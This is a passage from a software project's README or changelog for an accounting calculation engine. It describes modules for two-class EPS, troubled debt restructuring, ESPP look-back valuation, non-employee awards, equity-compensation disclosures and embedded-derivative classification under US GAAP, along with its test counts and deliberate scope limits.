debt or mandatorily-redeemable-preferred territory instead, not a variant of this
module; deriving the fair value itself for the liability path's ongoing remeasurement
(the same manual-entry-only limitation `fairValueRemeasurement.ts`'s own doc comment
already states); and a stacked multi-SAFE conversion waterfall, where several SAFEs
with different caps/discounts/seniority all convert at once — each SAFE here is
modeled and converted independently.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
classification and journal-entry logic is fully covered by the 10 new tests, including
one confirming the liability path's fair value roll-forward actually calls into
`fairValueRemeasurement.ts` correctly.

## Participating/convertible preferred: as-converted dilution and the two-class EPS method (v0.20.0, continued again)

Still working through the task-status list. 325/325 tests pass (up from 312 — 13 new
tests: 4 in `capTable.test.ts`, 9 in `epsTwoClass.test.ts`).

Two pieces closed out together, since they're related but genuinely separate
questions. First, **as-converted dilution**: `PreferredStockInstrumentTerms`
(`dispatch.ts`) gained an optional `conversionTerms` field (`quantity` x
`conversionRatio`), and `capTable.ts`'s PREFERRED_STOCK branch now computes an
as-converted share count for a convertible mezzanine or permanent-equity preferred
when it's present — the identical as-converted mechanics `CONVERTIBLE_NOTE` already
used in that same file. Non-convertible preferred (plenty of real preferred stock has
no conversion feature at all) still correctly falls through to the existing
"unsupported, no conversion ratio modeled" flag when `conversionTerms` is omitted —
this rollup has no way to distinguish "genuinely not convertible" from "convertible,
terms just not entered yet" other than the caller supplying one, so silence stays
silence rather than being guessed at as zero.

Second, and bigger: `src/lib/accounting/epsTwoClass.ts` implements the ASC 260-10-45
two-class method for basic EPS, for the single most common real-world shape — common
stock plus one class of participating convertible preferred. The rule most often
gotten wrong is checked first, not bolted on as an afterthought: a net loss, or a net
income that doesn't even cover dividends actually declared, allocates NOTHING to the
participating class (ASC 260-10-45-62) — all of it stays with common, the same way it
would in a plain, non-participating capital structure. Above that floor, undistributed
earnings split pro-rata by as-converted share count between common and the
participating class. Diluted EPS runs a second calculation — the "if-converted"
method, assuming the participating class actually converted at the start of the
period, no separate dividend carve-out, its shares simply joining the denominator —
and reports whichever of the two methods is more dilutive (ASC 260-10-45-60/45-61),
except in a loss period, where diluted EPS is always exactly the basic two-class
result: including a potentially dilutive security can never make a loss look smaller
per share (ASC 260-10-45-17's anti-dilution rule), so the if-converted comparison
isn't even run when net income is zero or negative.

Reachable via `POST /api/reports/eps` (modes `BASIC`, `DILUTED`) and a new calculator
page at `/reports/eps`. The participating class's as-converted share count that feeds
it should come from `capTable.ts`'s PREFERRED_STOCK branch above, not be independently
re-derived — the same number answers both questions.

**Deliberately out of scope**, per the module's own doc comment: more than one
simultaneous participating class (real, separate allocation logic, not a loop around
this function); a participation rate other than as-converted parity, or a
participation cap (some real provisions cap how much of the upside a participating
security can share in); and full multi-security dilution sequencing, where GAAP
requires ranking every potentially dilutive security from most to least dilutive and
adding them one at a time rather than testing exactly one class against basic EPS.
Also out of scope: this module takes `dividendsDeclaredToParticipatingClass` as a
given input rather than deriving it — for a CUMULATIVE participating preferred, the
correct number per ASC 260-10-45-11/45-12 is the period's accrued cumulative dividend
whether or not actually declared, which `preferredStock.ts`'s
`buildCumulativeDividendAccrualSchedule` already computes; this module doesn't
re-derive that figure itself.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic (both the cap table as-converted change and the EPS engine) is fully
covered by the 13 new tests, including several hand-computed golden scenarios for the
two-class allocation and the if-converted comparison.

## Troubled debt restructuring — ASC 470-60 (v0.20.0, continued again)

Still working through the task-status list. 335/335 tests pass (up from 325 — 10 new
tests in `troubledDebtRestructuring.test.ts`).

`src/lib/accounting/troubledDebtRestructuring.ts` is a genuinely different model from
the debt modification/extinguishment engine above (ASC 470-50), not a variant of it —
worth stating plainly because the two are the single point most often confused. ASC
470-50's 10% test discounts both the old and new cash-flow streams at the original
debt's effective rate and compares present values. ASC 470-60-35-5's test for a TDR
compares the debt's carrying value to the total future cash payments **UNDISCOUNTED**
— no time-value-of-money adjustment at all — because the premise is different: a TDR
happens when a creditor grants a concession specifically because the debtor is in
financial difficulty, not as an arm's-length renegotiation between equals. Using this
calculator (or this module) at all should only happen after that threshold judgment —
is this actually a concession due to financial difficulty, or an ordinary
renegotiation — has already been made outside the tool; it isn't detected here.

`classifyTdrModification` runs that undiscounted test and returns one of two
outcomes. If total future cash payments come in below the current carrying value, the
creditor's concession is recognized immediately: `buildTdrGainEntry` books a gain equal
to the difference, and the carrying value is written down to exactly the sum of what's
left to pay — which means, mechanically, that the debt has zero interest expense for
the rest of its life, since carrying value now already equals every remaining payment
with nothing left to accrete. `buildTdrReducedCarryingValueSchedule` produces that
schedule: every row's interest is zero, and the ending balance rolls down to precisely
zero over the remaining cash flows, with a length-mismatch check against the supplied
payment schedule. If total future payments are at or above carrying value, there's no
gain — instead a new effective rate is solved for and amortized going forward. This
branch deliberately reuses `solveEffectiveYield` and `buildEffectiveInterestSchedule`
from `debtAmortization.ts` directly rather than building a parallel amortization
engine — the same effective-interest math, just fed a different final carrying
value/cash-flow pair. A dedicated test reruns the exact $95,000/$100,000/5.263158%
golden scenario `debtAmortization.ts`'s own single-period effective-interest test
uses, hand-verified, specifically to prove that reuse is correct rather than
coincidentally close.

A third path, full settlement, covers a restructuring where the debtor transfers
assets or equity instead of continuing to pay cash: `buildTdrSettlementEntry` books a
gain or loss equal to the debt's carrying value minus the fair value of what was
transferred, handling both directions (a loss when the consideration is worth more
than the debt extinguished, a gain when it's worth less) rather than assuming a gain
is always the outcome.

Reachable via `POST /api/reports/troubled-debt-restructuring` (modes `TEST`,
`GAIN_ENTRY`, `REDUCED_CARRYING_VALUE_SCHEDULE`, `SETTLEMENT_ENTRY`) and a new
calculator page at `/reports/troubled-debt-restructuring`.

**Deliberately out of scope**, per the module's own doc comment: a partial settlement
that combines both the gain-recognition path and a continuing, reduced debt obligation
in the same restructuring (real, and common, but a materially more involved
allocation than either pure path modeled here); and restructured terms with
contingent-payment features (payments that vary with future revenue, an equity
kicker, and similar), which would need their own estimation approach rather than a
fixed schedule of future cash payments.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic is fully covered by the 10 new tests, including the hand-verified
new-effective-rate golden scenario described above.

## ESPPs — ASC 718-50 look-back option valuation (v0.20.0, continued again)

Still working through the task-status list. 351/351 tests pass (up from 335 — 16 new
tests in `espp.test.ts`).

`src/lib/accounting/espp.ts` answers two genuinely separate questions for an employee
stock purchase plan, kept as separate functions rather than one with a flag. First,
**is the plan compensatory at all?** ASC 718-50-25-1 lets a plan avoid recognizing ANY
compensation cost — not a reduced amount, none — if it meets every one of: essentially
all employees may participate on an equitable basis; the discount from market price is
no greater than what a company could reasonably offer any shareholder in raising
capital through a public offering (5% or less is a safe harbor needing no further
support; up to 15% can still qualify, but only with evidence justifying the larger
discount — a factual finding this module takes as a given boolean input, not something
it derives); and the plan has no option-like features. That last criterion is the one
most often overlooked: it categorically means a plan with a LOOK-BACK feature
(purchase price based on the lower of the price at the start or end of the offering
period) is compensatory, full stop, no matter how small the stated discount is —
`classifyEsppPlan` checks the look-back flag before it even looks at the discount
percentage.

Second, for a compensatory plan, **what's the grant-date fair value of the purchase
right?** Two structures get genuinely different math. A **no-look-back, discount-only**
plan (`computeEsppDiscountOnlyFairValue`) has no optionality in its payoff at all — the
employee always receives exactly `discount x purchase-date price` of value regardless
of which way the stock moved — so it's priced as a forward, not an option: `discount x
grant price x e^(-dividendYield x T)`, with no volatility input at all (a real-world
mistake this module's doc comment calls out explicitly: running Black-Scholes on a
payoff that was never optional to begin with). A **look-back** plan
(`computeEsppLookbackFairValue`) genuinely is compound optionality, and rather than
reaching for a lattice or Monte Carlo model, this module decomposes the payoff into a
closed form: writing `MIN(grant price, purchase price)` as `grant price` minus a put
payoff struck at the grant price, the algebra collapses to `Payoff = CallPayoff(K=grant
price) + discount x grant price - discount x PutPayoff(K=grant price)` — verified by
hand for flat, up, and down outcomes in the test file — and taking the risk-neutral
discounted expectation term-by-term gives `FairValue = Call(K=grant price,T) + discount
x grant price x e^(-rT) - discount x Put(K=grant price,T)`. The put itself is derived
via ordinary put-call parity from the existing `blackScholesCallValue` (used for option
grants since well before this module existed), not a second, independently-written
option-pricing model — the same reuse-over-reinvention approach as everywhere else in
this codebase. A direct algebraic check in the tests confirms that with a zero
discount, the look-back formula collapses to exactly the plain at-the-money call value,
which it must since the discount is what makes the two formulas diverge.

Recognition and purchase accounting reuse existing engines rather than reinventing
them: the grant-date fair value is expensed straight-line over the offering period via
`vesting.ts`'s `buildServiceConditionSchedule` (a single tranche vesting at the
purchase date is exactly what an offering period's only "vest date" is), and the
purchase itself — cash paid at the discounted price, plus the compensation cost
already recognized in Additional Paid-In Capital reclassifying into Common Stock
alongside it — is the identical accounting shape as a cash option exercise, so
`buildEsppPurchaseEntry` is a thin wrapper around `optionSettlement.ts`'s existing
`buildCashExerciseEntry` rather than a new journal-entry function. Passing a
grant-date fair value of 0 (the noncompensatory case) naturally produces a plain "cash
in for shares out" entry with no APIC line, since `buildCashExerciseEntry` already
omits that line whenever there's nothing to reclassify.

Reachable via `POST /api/reports/espp` (modes `CLASSIFY`, `FAIR_VALUE`,
`PURCHASE_ENTRY`) and a new calculator page at `/reports/espp`.

**Deliberately out of scope**, per the module's own doc comment: multiple purchase
periods within one offering with a "reset"/rollover feature (a real, common provision
where the offering restarts at a new, lower floor price if the stock has fallen at an
interim purchase date — genuine path dependency this closed-form decomposition can't
capture, needing a lattice or Monte Carlo model instead); employee mid-offering
withdrawal optionality (most plans let a participant pull contributions out before the
purchase date if the stock has fallen, which is itself an option layered on top of the
look-back option already modeled — this module assumes full participation through the
purchase date); the IRC Section 423(b)(8) $25,000-per-calendar-year purchase limit and
any other plan-specific share/dollar caps (these constrain the quantity of shares
purchasable, taken as a given input rather than derived); and non-Section-423
("non-qualified") ESPPs, which are always compensatory by their nature and simply skip
`classifyEsppPlan` entirely.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic is fully covered by the 16 new tests, including a direct hand-check
of the look-back payoff decomposition's algebra and several Black-Scholes plausibility/
monotonicity checks in the same style already established for `blackScholes.ts`
elsewhere in this suite.

## Non-employee awards — ASC 718-10, post-ASU 2018-07 (v0.20.0, continued again)

Still working through the task-status list. 362/362 tests pass (up from 351 — 11 new
tests in `nonemployeeAwards.test.ts`, plus one confirming the backward-compatible
change to an existing function described below).

`src/lib/accounting/nonemployeeAwards.ts` starts from a fact worth stating plainly:
ASU 2018-07 largely UNIFIED nonemployee awards with the existing ASC 718 employee
model, eliminating the older, separate ASC 505-50 model that required continually
remeasuring a nonemployee award's fair value all the way through vesting. An
equity-classified nonemployee award is measured once, at grant date, exactly like an
employee award — which is why this module reuses `vesting.ts`'s existing
service-condition engine rather than building a second valuation/amortization model.
What's genuinely different, and what this module actually adds, is three narrower
pieces.

First, **the requisite service period presumption** (ASC 718-10-25-2C, added by ASU
2018-07): absent an award condition tied specifically to the nonemployee's FUTURE
performance — beyond simply providing the good or service that gave rise to the award
in the first place — the requisite service period is presumed to be the vesting
period. In the common case where there's no separate vesting condition at all (a
consultant paid in fully-vested stock for work already performed), that presumption
collapses to full, immediate recognition on the grant date. `determineNonemployeeVestingTranches`
encodes exactly that presumption. That immediate-vesting case turned out to be a
genuinely degenerate input for the existing vesting engine, not just a trivial
wrapper: a single tranche vesting on the grant date itself is a ZERO-DAY requisite
service period, and `vesting.ts`'s underlying `allocateStraightLineByElapsedTime`
correctly throws rather than attempting a straight-line allocation over zero days of
service — caught while writing this module's tests, before shipping, not by a test
failure discovered later. `buildNonemployeeAwardExpenseSchedule` handles that case
directly: the full grant-date fair value is booked entirely in whichever period
contains the grant date, which is the only sensible answer to "spread this over zero
days of service," rather than passing a zero-length period through to the shared
engine.

Second, **which account the expense hits** depends on who the counterparty is. A
nonemployee award to an ordinary vendor or consultant debits a compensation-style
expense account, same shape as an employee's. But per ASU 2019-08, a share-based
payment made to a CUSTOMER as consideration is measured under ASC 718 (identical
grant-date fair value mechanics) while its income statement classification follows
ASC 606's "consideration payable to a customer" guidance (ASC 606-10-32-25 through
32-27) — it reduces revenue, it is not an expense line at all.
`buildNonemployeeAwardRecognitionEntry` picks the account by `counterpartyType`,
reusing `journalEntries.ts`'s existing `stockCompExpenseEntry` rather than
duplicating its balance-and-reversal logic in a new function — that function now
takes an optional `expenseAccountName` parameter (defaulting to its original "Stock
Compensation Expense," so every one of its existing callers is unaffected; a
dedicated test confirms that explicitly).

Third, **timing for the customer case**: ASC 606-10-32-27 says consideration payable
to a customer reduces revenue no earlier than the LATER of when the entity recognizes
revenue for the related transferred goods or services, or when the entity grants the
consideration. `laterOfRevenueRecognitionOrGrant` computes that floor date — this
module does not run ASC 606 revenue recognition itself, taking the related revenue
recognition date as a given input, the same "flag rather than guess" boundary drawn
everywhere else this codebase touches a different Topic's guidance.

Reachable via `POST /api/reports/nonemployee-awards` (modes `VESTING_TRANCHES`,
`SCHEDULE`, `RECOGNITION_ENTRY`, `CUSTOMER_TIMING`) and a new calculator page at
`/reports/nonemployee-awards`. The full period-by-period `SCHEDULE` mode (which needs
an array of periods) isn't surfaced in the simple calculator UI — the same precedent
already set by the troubled debt restructuring calculator leaving its
`REDUCED_CARRYING_VALUE_SCHEDULE` mode API-only — but is reachable directly via the
API.

**Deliberately out of scope**, per the module's own doc comment: liability-classified
nonemployee awards (a cash-settled award to a consultant) — `stockAppreciationRights.ts`'s
existing cash-settled engine already models the liability-remeasurement mechanics
generically, and nothing about being a nonemployee award changes that model; the ASC
718-10-30-20A practical expedient letting an entity use an award's full contractual
term (rather than deriving a shorter expected term) as the expected term input to an
option-pricing model — that's a policy election about which number to feed into
`blackScholesCallValue`'s existing `expectedTermYears` input, not a separate
computation, so it's noted in the module's doc comment rather than modeled as a no-op
function; and determining, from scratch, whether a given award recipient IS a
nonemployee for accounting purposes — taken as a given classification.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic is fully covered by the 11 new tests, including the zero-day
immediate-vesting edge case described above and a direct check that
`stockCompExpenseEntry`'s new optional parameter doesn't change any existing caller's
behavior.

## Equity compensation footnote disclosures, continued (v0.20.0, continued again)

Still working through the task-status list. 368/368 tests pass (up from 362 — 6 new
tests in `equityCompDisclosures.test.ts`).

Two more pieces of the README's own pinned "additional ASC 718 footnote disclosures"
gap (see the "Reporting functionality" section above for the full 8-item list and its
update note). Both were added as further exports in `src/lib/accounting/reporting.ts`
— exactly where that pinned callout asked for them ("add these as further exports
alongside `buildStockCompDisclosure` in `reporting.ts`, not as a replacement for it"),
not as a new, separate module. Worth stating plainly since it very nearly went the
other way: a first pass at this item built a standalone `equityCompDisclosures.ts`
file, including a function that re-derived unrecognized compensation cost and its
weighted-average remaining recognition period — which turned out to be an exact
duplicate of `buildStockCompDisclosure`, already built in an earlier pass (v0.19.0)
and already reachable via the financial statements report. Caught before shipping by
re-reading the pinned callout's own text, which explicitly named where new exports
should go; the duplicate function was deleted rather than kept alongside the
original.

What's actually new: **(c) the award activity rollforward by count**
(`buildAwardActivityRollforward`) — outstanding at the start of a period, granted,
exercised/settled, forfeited, expired, and outstanding at the end, by SHARE COUNT.
That's a genuinely different rollforward from the two others already in
`reporting.ts`: `buildAccountRollForward` rolls forward DOLLAR amounts by account, and
`buildSettlementActivityDisclosure` rolls up TRANSACTION-level cash/tax effects —
neither tracks a running share-count balance. When events carry a weighted-average
exercise price, the WAEP columns roll too, by dollar balance (starting balance, plus
each granted event's dollars, minus each exercised/forfeited/expired event's dollars,
divided by the ending share count) rather than a naive average of the per-event
prices, which would silently ignore how many shares each event actually represents.

**(e) intrinsic value realized across exercises** (`computeIntrinsicValueRealized`) —
the pinned callout specifically named this as blocked on "a per-period market/
FMV-at-exercise input this codebase doesn't currently collect anywhere." That
observation was true but incomplete: the real gap was just that no function existed
yet that would accept that FMV as a given input and do the arithmetic. This one does
— `quantity * (FMV at exercise - exercise price)`, summed across a batch of events,
mirroring the exact per-event calculation `optionSettlement.ts`'s `computeCashExercise`
already performs — the same "given input" boundary this codebase draws everywhere
else it would otherwise need to reach into a different Topic's data. It deliberately
does NOT also total cash received: `buildSettlementActivityDisclosure` already owns
that number, and a second function recomputing it from overlapping inputs would just
be duplication with different variable names.

Reachable via `POST /api/reports/equity-comp-disclosures` (modes `ROLLFORWARD`,
`INTRINSIC_VALUE`) and a new calculator page at `/reports/equity-comp-disclosures`.

**Still not built anywhere**, per `reporting.ts`'s own doc comment above these two
functions: (b) the fair-value-assumptions rollup table (blocked — this platform's
schema doesn't persist per-grant valuation assumptions, only the resulting fair
value) and (f) the vested/expected-to-vest table (a genuinely different prospective
forfeiture-rate methodology, not attempted).

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic is fully covered by the 6 new tests, including the WAEP
dollar-balance rollforward and the zero-outstanding-shares division guard.

## Embedded derivative bifurcation — the ASC 815-15-25 classification triage (v0.20.0, continued again)

Still working through the task-status list. 374/374 tests pass (up from 368 — 6 new
tests in `embeddedDerivativeBifurcation.test.ts`).

This is the "Bifurcated convertible instruments / embedded derivatives" row that had
sat as Not Started since the very first version of the task-status list, deliberately
deferred as materially higher complexity. It's now Pending rather than Complete —
worth being precise about which HALF moved. `src/lib/accounting/embeddedDerivativeBifurcation.ts`
answers the CLASSIFICATION question — does a conversion feature embedded in a debt
host need to be bifurcated at all — not the VALUATION question of what a bifurcated
derivative is actually worth, which remains genuinely out of reach without a lattice
or Monte Carlo model this codebase doesn't build.

The general rule (ASC 815-15-25-1) requires bifurcation only when the embedded
feature isn't "clearly and closely related" to the host, would itself meet the
definition of a derivative if freestanding, and the hybrid instrument isn't already
at fair value through earnings. For a conversion feature specifically, there's a
scope exception at ASC 815-10-15-74 that's almost always decisive in practice: a
conversion feature indexed to the issuer's OWN STOCK that would be equity-classified
if freestanding is excluded from bifurcation entirely — which is exactly why
plain-vanilla convertible debt essentially never gets bifurcated. The useful
observation this module makes is that answering "would this be equity if
freestanding" for a conversion feature is the IDENTICAL question `warrantAllocation.ts`'s
`classifyWarrant` already answers for a warrant — both are, for this purpose, just
"an option to receive the issuer's own stock." So `classifyEmbeddedConversionFeature`
calls `classifyWarrant` directly rather than re-deriving the same fixed-for-fixed/
net-settlement/down-round test a second time: an "equity" result means the exception
applies and bifurcation is NOT required; a "liability" result means it doesn't and
bifurcation IS required (a liability-classified conversion feature is, by definition,
not clearly and closely related to a plain debt host, since its value moves with the
issuer's stock price); a "review" result (down-round protection present) is passed
through as a review outcome here too, rather than guessing which way that judgment
call would land.

Reachable via `POST /api/reports/embedded-derivative-bifurcation` and a new
calculator page at `/reports/embedded-derivative-bifurcation`.

**Deliberately out of scope**, per the module's own doc comment: valuing a derivative
that comes back REQUIRED to bifurcate — a meaningfully larger undertaking than this
codebase's existing closed-form Black-Scholes pricing, since a reset provision or a
make-whole is genuinely path-dependent in a way a closed form can't represent, and
exactly the "materially higher complexity" this row was originally deferred for;
embedded features other than a conversion option (interest-rate indices, FX-linked
principal, contingent puts/calls — each with its own ASC 815-15-25-24 through 25-46
analysis); a conversion feature indexed to something other than the issuer's own
stock; and multiple embedded features in the same host evaluated together.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
classification logic is fully covered by the 6 new tests, including one that directly
confirms `classifyEmbeddedConversionFeature` reuses `classifyWarrant`'s exact
classification rather than a re-derived copy.

## The one deliberate hack: `decimal.ts`

Every accounting calculation in this codebase should run on `decimal.js` — the
standard, battle-tested arbitrary-precision library — not hand-rolled arithmetic. That's
what `package.json` lists as a dependency. But `decimal.js` couldn't be installed in
this sandbox either, and financial calculations cannot safely run on native JS floating
point (rounding drift compounds across periods and shows up as an out-of-balance
journal entry). So `src/lib/accounting/decimal.ts` is a minimal, dependency-free
fixed-point `Decimal` type built on BigInt, with the same call sites (`new Decimal(x)`,
`.plus`, `.minus`, `.times`, `.div`, comparisons, `.abs`, `.negated`, `.pow`, `.max`)
used everywhere else in the engine.

**Once you can run `npm install` normally**, swap `decimal.js` in: delete
`decimal.ts`, and in `types.ts` replace
`export { FixedDecimal as Decimal } from "./decimal.js";` with an import from
`decimal.js` instead. Every other file imports `Decimal`/`DecimalValue` from
`types.ts`, not from `decimal.js` directly, so that's the only file that needs to change.

## Gaps against the original 7-point scope

This build covers the calculation engine for a representative slice of instrument
types. Weighed against the full scenario list in the test-suite document from earlier
in this project (Debt and Equity Accounting Test Suite Scenarios), here's what's built
vs. open:

**Built:** service/performance/market-condition stock options and RSUs, term loans,
revolving lines of credit, PIK notes, conventional convertible notes, detachable-warrant
relative-fair-value allocation, stock appreciation rights (both stock- and
cash-settled), a representative slice of preferred stock (classification triage plus
liability/mezzanine subsequent measurement — see below), restricted stock and
early-exercised stock options (compensation expense plus the repurchase-right-lapse
reclassification — see below), and the modification/replay architecture that all of
them run through.

**All of the above are now wired into `dispatch.ts` end to end** — reachable from the
close/correction API routes and the front end, not just callable in isolation. That
distinction used to matter here: the underlying engine functions for revolvers, PIK
notes, convertible notes, and warrants existed for a while before `dispatch.ts`'s
`getScheduleBuilder`/`journalEntryForRow` actually routed to them, so only
STOCK_OPTION/RSU and TERM_LOAN were ever clickable through the app. WARRANT is the one
case worth understanding specifically: its dispatch branches on `classifyWarrant`'s
result — "equity" produces no periodic schedule (the relative-fair-value allocation is
a one-time issuance entry, not a per-period row), "liability" runs the existing fair-
value-remeasurement engine every period, and "review" (down-round protection present)
throws rather than guessing, surfacing as a clear error on the instrument page rather
than a wrong number. REVOLVER's schedule covers the unused-commitment fee and deferred
financing fee amortization only — interest on the drawn balance still isn't modeled
here, since that needs the daily-accrual engine's genuinely different input shape (see
`buildRevolverSchedule`'s doc comment in `debtAmortization.ts`). COMMON_STOCK still has
no periodic engine at all (it never needed one — see capTable.ts's doc comment).

**SAR (stock appreciation rights) is now built (v0.14.0)** —
`src/lib/accounting/stockAppreciationRights.ts` — and it's the one instrument type
whose accounting genuinely forks on a single fact about the award: what it settles in.
A STOCK-settled SAR is equity-classified (ASC 718-10) and, for measurement purposes, is
economically identical to a stock option — fixed grant-date fair value, straight-line
(or graded) attribution, no subsequent remeasurement — so it's wired straight through
`buildServiceConditionSchedule`, the exact function STOCK_OPTION/RSU already use, with
only the ASC citation on the resulting rows relabeled. A CASH-settled SAR is
liability-classified (ASC 718-30) and needed a genuinely new engine
(`buildCashSettledSarSchedule`): the award is remeasured to fair value at EVERY
reporting date — during vesting AND after, all the way to settlement — with cumulative
compensation cost as of any date equal to (the requisite-service fraction elapsed) ×
(the award's current fair value). Two things about this that surprise people coming
from the stock-option case: a period's expense can be a credit/gain if fair value fell,
even mid-vesting, since variable/liability accounting doesn't floor at zero the way a
forfeiture reversal does; and remeasurement doesn't stop at full vesting the way an
equity award's does — every fair-value change keeps flowing through compensation cost
until the SAR is exercised/settled or expires. Flagged simplification: only
straight-line attribution over the full award (not graded, tranche-by-tranche
attribution) is supported for the cash-settled case — a real, more complex extension
this pass doesn't cover, said outright rather than silently picking the simpler method.
`dispatch.ts`'s SAR branch is a discriminated union on `settlementType`, mirroring how
the WARRANT branch already forks on `classifyWarrant`'s result.

**PREFERRED_STOCK (a representative slice) is now built (v0.15.0)** —
`src/lib/accounting/preferredStock.ts` — following the exact same "classify first,
then dispatch to genuinely different accounting" shape WARRANT and SAR already use.
Three classifications under ASC 480-10-25-4 / 480-10-S99-3A: MANDATORILY redeemable
(a fixed date, or upon an event certain to occur) is liability-classified, and ASC
480-10-35-3 requires accreting from issuance proceeds to the mandatory redemption
amount using the interest method, with dividends treated as interest — which is
EXACTLY the effective-interest debt model TERM_LOAN already has, so this branch
delegates straight to `buildEffectiveInterestSchedule` rather than building new math.
Redeemable at the HOLDER's option, or upon a contingent event outside the company's
control (a change of control or deemed liquidation — the single most common real-world
VC-preferred provision), is MEZZANINE equity, sitting in temporary equity with its
carrying value accreted toward the redemption value — a genuinely new engine
(`buildMezzanineAccretionSchedule`, straight-line only; the effective-interest/
rate-of-return alternative ASC 480-10-S99-3A also permits isn't implemented, flagged
rather than silently picked). Everything else is PERMANENT equity, with no periodic
schedule at all. **Explicitly out of scope as of this version, said outright rather
than covered by omission:** embedded feature bifurcation (ASC 815-15) for a preferred
host with a separately-accounted conversion option. Three items originally listed here
as out of scope have since been built: the beneficial conversion feature (ASC
470-20-30, v0.20.0 — see that section below); convertible preferred's as-converted
dilution (v0.20.0 — a `conversionTerms` field on `PreferredStockInstrumentTerms` now
lets `capTable.ts` compute it, see the cap table note below); and the ASC 260-10-45
two-class EPS method for a single participating class (v0.20.0 — see the "Two-class
EPS" section below; multiple simultaneous participating classes, a non-parity
participation rate, and full multi-security dilution sequencing remain out of scope,
per that module's own doc comment). One more genuinely different piece worth calling
out: cumulative preferred dividends accrue whether or not declared (a real number CPAs
need for the two-class EPS method and liquidation-preference disclosures), but an
undeclared cumulative dividend is NOT a balance-sheet liability or P&L expense under
GAAP — nothing is actually booked until the board declares one. That's a different
shape from every other schedule in this codebase (each of which produces one real,
closeable journal entry per period), so `buildCumulativeDividendAccrualSchedule` is
exported standalone for a future disclosure-only view, deliberately NOT wired into
`dispatch.ts`'s close-workflow functions — forcing a fabricated journal entry just to
fit that shape would be worse than leaving the gap visible.

**RESTRICTED_STOCK (restricted stock and early-exercised stock options) is now built
(v0.16.0)** — `src/lib/accounting/restrictedStock.ts`. These two award types are grouped
under one instrument type because, once the shares are actually outstanding, they're
accounted for identically: an employee either purchases restricted stock directly at
grant (often at a nominal price) or early-exercises a stock option before it vests —
either way, the company holds a right to repurchase the UNVESTED shares at the original
purchase/exercise price if the holder leaves before vesting, and that repurchase right
is the one fact driving the accounting that's actually new here. Compensation expense is
completely unaffected by the early-exercise/restricted mechanic — it's grant-date fair
value (net of whatever the holder paid) recognized straight-line or graded over the
requisite service period, exactly `buildServiceConditionSchedule`, the same engine
STOCK_OPTION/RSU and a stock-settled SAR already delegate to. What's genuinely new is
balance-sheet presentation: because the company can force a sale back at cost if the
holder leaves early, the consideration received for not-yet-vested shares isn't real,
unconditional equity — it sits in a liability (an "early exercise liability," or
"unvested shares subject to repurchase") until each tranche's own vest date, when the
repurchase right lapses and that tranche's purchase price reclassifies into real equity
(ASC 718-10-25-9). That reclassification is a discrete, per-tranche event on each
tranche's own vest date, not a day-weighted allocation — a genuinely different
computation from expense attribution, which is why `buildRepurchaseRightLapseSchedule`
is a new, separate function rather than a variant of an existing one. Both schedules are
built from the exact same `tranches` array (`RestrictedStockInstrumentTerms` in
`dispatch.ts`), so the two halves can never drift out of sync; `restrictedStockEntry`
(`journalEntries.ts`) always books both line-pairs together — compensation expense and
the reclassification — even when one side is $0 for a period, since the two numbers are
unrelated in magnitude and there's no meaningful netted version of this entry.
**Explicitly out of scope, said outright rather than covered by omission:** a grant
where different tranches were purchased at different per-share prices (one
`purchasePricePerShare` covers the whole grant), and a fair-value (rather than
cost) repurchase right — which would actually mean the award doesn't qualify as a real
"sale" for accounting purposes at all (ASC 718-10-25-9) and needs a different treatment
this module doesn't attempt to detect. For the cap table rollup, a RESTRICTED_STOCK
grant counts its full quantity as fully-diluted shares from day one, the same
"fully diluted regardless of vesting status" rule STOCK_OPTION/RSU already follow — the
repurchase right affects where the purchase price sits on the balance sheet, not whether
the underlying shares count toward dilution.

**Original requirement #1 (cap tables) is now built**, not just the per-instrument
listing it used to be: `src/lib/accounting/capTable.ts` computes a real fully-diluted
ownership rollup — total fully-diluted shares, each stakeholder's share count and
ownership %, kept strictly separate from debt (a lender's outstanding balance doesn't
participate in the ownership-% denominator at all). Every equity type this codebase
currently understands feeds into it: stock options/RSUs and common stock read their
`quantity` directly; a warrant counts `sharesIssuable` regardless of its equity/
liability classification (dilution doesn't care which balance-sheet line a warrant's
fair-value change runs through — only its P&L treatment does); a convertible note
computes as-converted shares from face value over conversion price (a flagged
simplification — it excludes accrued PIK/deferred interest that would also convert in
most real note terms); a STOCK-settled SAR counts its `equityTerms.quantity` the same
way a stock option does (it settles in shares, so it's dilutive on the same basis); a
RESTRICTED_STOCK grant (restricted stock / early-exercised options) counts its full
quantity the same way, from day one, regardless of vesting or repurchase-right status;
LIABILITY-classified (mandatorily redeemable) preferred stock is booked into the "Debt
holders" table with its outstanding balance, the exact same treatment TERM_LOAN/
REVOLVER/PIK_NOTE get, since it behaves like debt accounting-wise. A CASH-settled SAR
and a MEZZANINE/permanent-equity preferred with no `conversionTerms` supplied are each
real instruments this rollup can't fully classify: the SAR is a genuine liability that
never dilutes and isn't a lender-style debt balance either; a non-convertible preferred
genuinely has no as-converted share count to compute (as of v0.20.0, a CONVERTIBLE
mezzanine/permanent-equity preferred DOES get an as-converted share count, via the new
`conversionTerms` field — see the "SAFEs" section's sibling write-up, "Participating /
convertible preferred as-converted dilution" below, for the full change). Both
remaining gaps are surfaced in the cap table page's explicit "not included" list rather
than silently placed in either existing bucket or dropped — a cap table that quietly
drops a real instrument is worse than one that visibly admits the gap.
`src/app/captable/page.tsx` computes this live (today's numbers), the same way the
instrument page's live preview works, not gated behind the close workflow the way
period expense recognition is.

**Partially built as of v0.20.0:** bifurcated convertible instruments and
embedded derivatives — the ASC 815-15-25 bifurcation CLASSIFICATION test is now built
(see the "Embedded derivative bifurcation" section below), but valuing a derivative
that comes back required to bifurcate is not — that needs a lattice/Monte Carlo model,
still genuinely deferred for materially higher complexity. (SARs moved to "Built" as of
v0.14.0; a representative slice of preferred stock — classification, liability/mezzanine
subsequent measurement — moved to "Built" as of v0.15.0; restricted stock and
early-exercised stock options moved to "Built" as of v0.16.0; debt
modification-vs-extinguishment (the 10% cash flow test), the beneficial conversion
feature (ASC 470-20-30), SAFEs, convertible preferred's as-converted dilution, the
two-class EPS method, troubled debt restructuring (ASC 470-60), ESPPs (ASC 718-50
look-back option valuation), and non-employee awards all moved to "Built"
as of v0.20.0 — see the sections below —
